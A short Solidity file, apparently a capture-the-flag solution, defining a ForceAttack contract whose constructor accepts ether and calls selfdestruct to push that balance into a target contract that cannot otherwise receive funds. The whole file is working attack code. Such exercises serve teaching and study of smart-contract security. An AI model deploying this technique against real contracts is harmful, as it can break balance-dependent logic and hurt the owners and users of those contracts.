// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract ForceAttack {

    constructor (address payable _instanceAddress) public payable {
        require(msg.value > 0);
        selfdestruct(_instanceAddress);
    }
}